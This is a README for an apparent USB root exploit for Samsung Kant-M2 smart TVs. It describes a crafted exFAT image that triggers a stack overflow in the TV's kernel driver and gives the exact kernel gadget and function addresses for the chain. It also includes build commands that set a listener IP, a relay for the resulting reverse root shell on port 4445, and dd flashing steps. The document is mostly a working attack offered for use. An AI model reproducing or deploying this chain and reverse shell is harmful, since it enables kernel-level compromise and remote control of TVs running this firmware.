# samsung-tv-usb-root-kant

One-plug USB root for the Samsung 2018 Kant-M2 platform, developed and
physically validated on:

```text
Model:    QE49Q6FNA
Platform: 18_KANTM2_QTV
Firmware: T-KTM2DEUC 1400.2
Kernel:   Linux 4.1.10 ARMv7
```

The USB has two partitions:

1. a from-scratch exFAT filesystem whose crafted `num_ext` entry triggers the
   shipped Samsung exFAT driver's stack overflow;
2. a normal FAT32 partition used as a writable proof volume.

The kernel chain is calibration-free: it uses an untouched runtime `ip`
pointer, copies a stage into an unreferenced fixed core-text cave, flushes the
cache, invokes the signed `/bin/bash` through `call_usermodehelper`, and parks
the corrupted task with `schedule_timeout_uninterruptible`. No UART,
Developer Mode, pairing, device-specific stack address, firmware rewrite or
module padding is required.

## Status

Physically verified on the TV above:

```text
interactive Bash: uid=0(root)
Linux Samsung 4.1.10 armv7l
```

**The USB stick must be connected for every boot in the current setup. Root is
not available on a boot without it, and there is no persistent boot hook or
SSH service in this repository.**

Operational note: on the validated unit, leaving the stick inserted across
several boots produced a reboot loop. Remove it once the shell is established.
Reinserting it while the TV is running does not trigger the chain again; the
next boot needs the stick again.

## Build a stick

Requires Python 3.11 or newer and Clang with ARM integrated-assembler support.

```sh
python3 -m venv .venv
. .venv/bin/activate
python -m pip install -r requirements.txt
python -m unittest discover -s tests -v
python tools/build.py --variant umh-boot --beacon LISTENER_IP:4444
```

Replace `LISTENER_IP` with the address the TV can reach. There is no default
listener. The stage waits on port 4444 and opens the reverse shell on 4445.

Output is `out/umh-boot/usb.img`, its component files and `manifest.json` with
sizes and SHA-256 hashes. Existing output directories are refused. The build
writes regular files only; it does not connect to a TV or flash a disk.

Flash the image to the whole USB device (this destroys that device):

```sh
sudo dd if=out/umh-boot/usb.img of=/dev/sdX bs=4M conv=fsync status=progress
sync
```

On macOS, `tools/write_usb.sh` performs the same write with an explicit
confirmation and refuses internal disks.

Start the relay before powering on the TV; the shell connects only once per
cold boot:

```sh
python lab/relay_shell_4445.py --bind 0.0.0.0 --port 4445 \
  --log out/root_shell.log --commands out/cmds.txt
```

See [docs/USB-STICK.md](docs/USB-STICK.md) for the full procedure, variants
and validation record.

## What one plug does

1. storaged mounts and enumerates p1 (exFAT).
2. The `num_ext` overflow reaches `ffsReadDir`'s saved registers.
3. The fixed kernel chain copies the stage to the unreferenced cave
   `0xc0008358..0xc0009000`, flushes the cache and jumps to it.
4. The stage starts the signed `/bin/bash` with `UMH_NO_WAIT`. The default
   `umh-boot` stage writes no kernel text and relies on the stock signed bash;
   the `umh` variant patches the UEP verifier in RAM if bash is blocked.
5. Bash connects back to the listener on port 4445 with an interactive root
   shell.
6. Removing the stick and power-cycling the TV clears the stage and the
   shell. Nothing is written to the TV firmware.

## Disk layout

| partition | format | contents |
|---|---|---|
| p1 | 8 MiB exFAT | from-scratch crafted trigger (`tools/mk_trigger.py`) |
| p2 | 64 MiB FAT32 | empty proof volume |

p2 is a plain FAT32 volume. The historical `proof` stage wrote
`ROOT_PROOF.txt` to mounted vfat/exfat volumes; the current `umh-boot` stage
does not depend on p2.

## Exact target constants

All addresses come from the shipped T-KTM2DEUC `kernel.bin`, never from a lab
kernel:

| purpose | address |
|---|---:|
| cave backing range | `0xc0008358..0xc0009000` |
| cave copy destination | `0xc00083d8` |
| `ldm ip,{r2,r3,r4,r7,r8,sb,sl,sp,lr,pc}` | `0xc04dde3c` |
| copy window (`r2=r4; r1=ip; r0=r6; blx r3`) | `0xc010598c` |
| post-copy r1 saver | `0xc00a5c44` |
| stage0 flush wrapper | `0xc0012954` |
| `v7_coherent_kern_range` | `0xc001cba8` |
| `memcpy` | `0xc01fa720` |
| UEP verification gate | `0xc01cdecc` |
| `call_usermodehelper` | `0xc0039a78` |
| `schedule_timeout_uninterruptible` | `0xc04cc05c` |

The injection offset is 1420 (`0x58c`). It is derived from the Kant-M2
`ffsReadDir` frame layout, not copied from another profile. See
[research/findings/kant-m2-chain.md](research/findings/kant-m2-chain.md).

## Which devices does this cover?

This is a port for the Kant-M2 platform, not for one TV only. The exFAT
`num_ext` overflow is present in the Kant-M2 driver, and the exFAT module is
byte-identical across the firmware family checked here. Other Kant-M2 models
running T-KTM2DEUC share the same code path.

The kernel addresses and frame offsets, however, are tied to the kernel image.
A different Kant-M2 firmware release must be checked against its own
`kernel.bin`; if the kernel is identical the constants apply, otherwise they
must be re-derived. The port has been physically validated only on
QE49Q6FNA with T-KTM2DEUC 1400.2. See
[docs/FIRMWARE-COMPATIBILITY.md](docs/FIRMWARE-COMPATIBILITY.md).

## Repository layout

```text
tools/                 image, trigger, cave and kernel-stage builders
payload/               payload notes; stage code is generated by tools/
lab/                   host-side shell relay and report decoder
research/findings/      frame geometry, gadget addresses and static analysis
docs/                   compatibility, provenance and operator notes
tests/                  offline packaging and image checks
```

## Public prerequisites not included

This repository intentionally contains no Samsung firmware, decrypted images,
shipped proprietary modules, device certificates, keys or live device dump.
To rebuild addresses for another firmware, provide your legally obtained
`kernel.bin` and the matching modules as documented in
[docs/PROVENANCE.md](docs/PROVENANCE.md).

## License

Code in this repository is AGPL-3.0-only, with the upstream license retained.
The upstream trigger builder is vendored unchanged. See
[docs/PROVENANCE.md](docs/PROVENANCE.md) for origins and credits.
